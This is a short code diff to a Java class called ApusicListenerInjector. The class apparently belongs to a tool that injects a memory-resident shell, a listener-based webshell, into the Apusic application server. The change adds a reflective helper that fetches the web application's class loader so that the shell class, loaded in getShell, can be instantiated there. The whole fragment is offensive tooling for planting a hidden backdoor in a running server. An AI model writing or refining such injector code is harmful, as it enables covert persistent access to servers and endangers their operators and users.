@@ -54,9 +54,17 @@ public class ApusicListenerInjector {
         return contexts;
     }
 
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
+        try {
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            return ((ClassLoader) getFieldValue(context, "loader"));
+        }
+    }
+
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
-        ClassLoader classLoader = context.getClass().getClassLoader();
+        ClassLoader classLoader = getWebAppClassLoader(context);
         try {
             return classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
